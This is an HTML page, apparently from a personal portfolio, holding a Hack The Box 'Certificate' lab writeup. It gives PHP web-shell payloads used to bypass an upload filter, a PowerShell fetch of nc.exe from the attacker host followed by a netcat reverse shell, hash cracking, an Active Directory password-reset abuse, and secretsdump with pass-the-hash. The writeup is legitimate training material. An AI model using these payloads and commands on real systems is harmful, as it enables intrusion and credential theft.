@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="HTB Certificate parsed writeup with full section flow, commands, notes, and screenshot evidence." />
+  <title>HTB Certificate Writeup | Will DeDominico</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/style.css" />
+</head>
+<body>
+  <div class="background-noise" aria-hidden="true"></div>
+  <header class="site-header">
+    <div class="logo-lockup">
+      <div class="logo-mark" aria-hidden="true">💾</div>
+      <a href="../index.html#home" class="logo-type">Will<span>DeDominico</span></a>
+    </div>
+    <button class="nav-toggle" aria-expanded="false" aria-controls="site-nav">
+      <span class="sr-only">Toggle navigation</span>
+      <span></span>
+      <span></span>
+    </button>
+    <nav id="site-nav" class="site-nav" aria-expanded="false">
+      <a href="../index.html#home">Home</a>
+      <a href="../index.html#experience">Experience</a>
+      <a href="../index.html#projects">Projects</a>
+      <a href="../index.html#writeups" class="is-active">Writeups</a>
+      <a href="../index.html#github">GitHub</a>
+      <a href="../index.html#ctf">CTFs</a>
+      <a href="../index.html#htb">HTB</a>
+      <a href="../index.html#clubs">Clubs</a>
+      <a href="../index.html#education">Education</a>
+    </nav>
+  </header>
+
+  <main>
+    <article class="section blog-layout post-content" aria-labelledby="post-title">
+      <header>
+        <h1 id="post-title">HTB Certificate Writeup</h1>
+        <div class="post-meta">
+          <time datetime="2025-06-08">June 8, 2025</time>
+          <span>11 minute read</span>
+          <div class="post-tags" aria-label="Topics">
+            <span class="post-tag">HTB</span>
+            <span class="post-tag">Hard</span>
+            <span class="post-tag">Windows</span>
+            <span class="post-tag">Web Exploitation</span>
+            <span class="post-tag">Active Directory</span>
+          </div>
+        </div>
+      </header>
+
+      <figure class="post-hero">
+        <img src="../assets/img/writeups/htb-certificate.png" alt="First page preview of the HTB Certificate writeup PDF report" />
+        <figcaption>Parsed from your HTB Certificate PDF report. Target profile: Hard Windows Server 2000 box.</figcaption>
+      </figure>
+
+      <div class="post-body">
+        <p><strong>Description (parsed):</strong> Certificate is a hard Windows machine focused on upload payload handling, AD-aware user pivots, and privilege escalation to SYSTEM through permissions and LOLBAS abuse.</p>
+
+        <div class="content-card">
+          <h3>Skills Required</h3>
+          <ul>
+            <li>Active Directory</li>
+            <li>Web exploitation</li>
+            <li>Windows permissions abuse</li>
+            <li>Password cracking</li>
+          </ul>
+        </div>
+
+        <div class="content-card">
+          <h3>Tools Used</h3>
+          <ul>
+            <li>Python</li>
+            <li>BloodHound</li>
+            <li>NetExec</li>
+            <li>evil-winrm</li>
+            <li>impacket</li>
+            <li>hashcat / JohnTheRipper</li>
+            <li>BloodyAD</li>
+          </ul>
+        </div>
+
+        <h2>Enumeration</h2>
+        <p>The report starts by identifying an education portal where student uploads are accepted with extension and MIME checks. This upload path becomes the initial attack vector.</p>
+
+        <h3>Upload Payload Bypass</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-certificate/page-03.png" alt="Certificate report screenshot showing upload filter behavior and payload attempts" />
+          <figcaption>Certificate · Upload filter bypass workflow.</figcaption>
+        </figure>
+        <p>Initial direct PHP payloads were blocked. The parsed workflow shows bypass attempts with extension tricks and a swap from <code>system()</code> to <code>shell_exec()</code> to evade filtering logic.</p>
+
+        <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;
+
+&lt;?php echo(shell_exec($_GET['cmd'])); ?&gt;</code></pre>
+
+        <div class="callout callout--info" data-label="Operator Note">
+          <p>MIME and content filters commonly key off patterns in the payload body, not only extension checks. Swapping execution primitives can make a blocked payload viable.</p>
+        </div>
+
+        <h3>Shell Stabilization</h3>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-certificate/page-06.png" alt="Certificate report screenshot showing netcat shell upgrade" />
+          <figcaption>Certificate · Netcat-based shell stabilization.</figcaption>
+        </figure>
+        <p>After web command execution, the flow serves <code>nc.exe</code> and upgrades to a stable command shell.</p>
+
+        <pre><code class="language-bash">python3 -m http.server 8000
+nc -lvnp 4444
+
+# web-exec trigger examples from report
+shell.php?cmd=powershell%20-c%20%22iwr%20http://10.10.x.x:8000/nc.exe%20-OutFile%20nc.exe%22
+shell.php?cmd=.\nc.exe%2010.10.x.x%204444%20-e%20cmd.exe</code></pre>
+
+        <h2>Foothold and Credential Mining</h2>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-certificate/page-07.png" alt="Certificate report screenshot showing database extraction and hash cracking context" />
+          <figcaption>Certificate · Database credential extraction and hash cracking.</figcaption>
+        </figure>
+        <p>From the web foothold, <code>db.php</code> config material is harvested. Database output provides user hashes, cracked with hashcat, then validated through NetExec and WinRM access checks.</p>
+
+        <pre><code class="language-bash">hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt</code></pre>
+
+        <h2>Privilege Escalation Path</h2>
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-certificate/page-08.png" alt="Certificate report screenshot showing bloodhound and account control path" />
+          <figcaption>Certificate · BloodHound-guided account control path.</figcaption>
+        </figure>
+        <p>The parsed chain uses BloodHound to identify control from <code>sara.b</code> to <code>Ryan.K</code> via <code>GenericAll</code>, then password reset with BloodyAD, followed by privilege abuse from <code>SeManageVolumePrivilege</code>.</p>
+
+        <pre><code class="language-bash">bloodhound-python -u sara.b -p [password] -dc dc01.x.htb -d x.htb -c all -ns 10.10.x.x
+
+bloodyAD -d domain.htb -u sara.b -p [password] --host 10.x.x.x set password Ryan.K [NewPassword]
+
+whoami /priv</code></pre>
+
+        <p>When direct flag-read attempts failed, the report pivots to a <code>diaghub</code> LOLBAS chain and later performs secrets dumping plus pass-the-hash to administrator.</p>
+
+        <figure class="writeup-shot">
+          <img src="../assets/img/writeups/htb-certificate/page-10.png" alt="Certificate report screenshot showing final SYSTEM access chain" />
+          <figcaption>Certificate · Final SYSTEM path with secretsdump and pass-the-hash.</figcaption>
+        </figure>
+
+        <pre><code class="language-bash">secretsdump.py domain.htb/[user]:[password]@domain.htb
+evil-winrm -i 10.x.x.x -u Administrator -H [hash]</code></pre>
+
+        <div class="callout callout--warning" data-label="Notes">
+          <p>The report also captures failed branches (AS-REP and insufficient DCSync privilege routes), which is useful for documenting why final path selection was chosen.</p>
+        </div>
+
+      </div>
+
+      <footer class="post-footer">
+        <p>Full technical report source:</p>
+        <a class="button primary" href="https://github.com/Moriz82/WriteUps-and-Reports/blob/main/HTB/HTB%20Certificate%20Write%20Up.pdf" target="_blank" rel="noopener">Open Original PDF</a>
+        <a class="button ghost" href="../index.html#writeups">Back to Writeups</a>
+      </footer>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <p>© <span id="copyright-year"></span> Will DeDominico · Field-tested from San Antonio, TX.</p>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
